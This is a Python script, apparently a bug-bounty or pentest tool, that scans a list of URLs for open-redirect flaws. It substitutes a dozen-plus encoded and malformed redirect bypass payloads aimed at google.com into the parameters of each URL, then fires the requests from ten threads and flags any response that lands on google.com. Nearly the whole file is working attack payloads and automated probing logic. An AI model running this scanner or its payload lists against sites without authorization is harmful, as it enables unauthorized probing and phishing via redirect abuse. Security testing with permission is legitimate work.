import requests
import sys
import re
import threading

PAYLOADS = ["google.com", "https%3A%2F%2Fgoogle.com", "https%3A%2F%2F%2F%2Fgoogle.com", "%40google.com", "%3A%2F%2Fgoogle.com", "@google.com", "://google.com", "https://google.com", "https://////google.com", "https://///google.com", "https:////google.com", "https:///google.com"]
PAYLOADS2 = ["google.com\\", "google.com?", "google.com&", "google.com%5c", "google.com%3F", "google.com#", "google.com%23", "google.com%26", "google.com\\", "https://google.com?", "https://google.com&", "https://google.com%5c", "https://google.com%3F", "https://google.com#", "https://google.com%23", "https://google.com%26"]


def openfile(var1):
    url_list = []
    try:
        with open(var1) as file:
            decoded_lines = file.read()
            lines = decoded_lines.split("\n")
            for line in lines:
                if "=http" in line or "=/" in line or "=%2f" in line or "aHR0c" in line:
                    if line.startswith("http"):
                        url_list.append(line)
                    else:
                        url_list.append("http://"+line)


        if len(url_list) > 0:
            print("[ ! ] {} Possible Redirect Parameters Found".format(len(url_list)))
            return url_list
        else:
            print("[ - ] Redirect Parameters Not Found")
            quit()

    except FileNotFoundError:
        print("[ - ] File Not Found")
        quit()


def redirect_urls(url_list):
    urls_to_request = []
    for url in url_list:
        url_value = re.search(r'([^=&?]+)=([^&]+)', url)

        for payload in PAYLOADS:
            url_to_request = url.replace("="+url_value.group(2), "="+payload)
            urls_to_request.append(url_to_request)

        url_value2 = re.search(r'^(?:https?:\/\/)?(?:[^@\/\n]+@)?(?:www\.)?([^:\/?\n]+)', url)

        for payload in PAYLOADS2:
            url_to_request2 = url.replace("="+url_value.group(2), ("="+payload + url_value2.group(1)))
            urls_to_request.append(url_to_request2)

    #Remove duplicates
    urls_to_request = list(dict.fromkeys(urls_to_request))
    return urls_to_request


def request():
    global urls_to_request
    while len(urls_to_request) > 0:
        url = urls_to_request.pop()
        try:
            r = requests.request("GET", url)
            # Check redirect
            str_url = str(r.url)
            if str_url.startswith("https://google.com") or "google.com" in str(r.headers) or str_url.startswith("https://www.google.com"):
                print("[ + ] Open Redirect found:", url)

        except Exception as error:
            if "host='google.com" in str(error):
                print("[ + ] Possible unsafe redirect detected. Check it manually:", url)


def banner():
    print("Tool by Luiz Viana - github.com/luizviana")
    print("Usage: redirfinder.py <url_list>")
    print("URL list format: [http|https://]example.com/redirect.php?test=example.com/file.html\n")


if __name__ == "__main__":

    if len(sys.argv) > 1:
        banner()
        var1 = sys.argv[1]
    else:
        banner()
        quit()


    urls = openfile(var1)
    urls_to_request = redirect_urls(urls)

    try:
        for i in range(10):
            t = threading.Thread(target=request)
            t.start()
    except:
        pass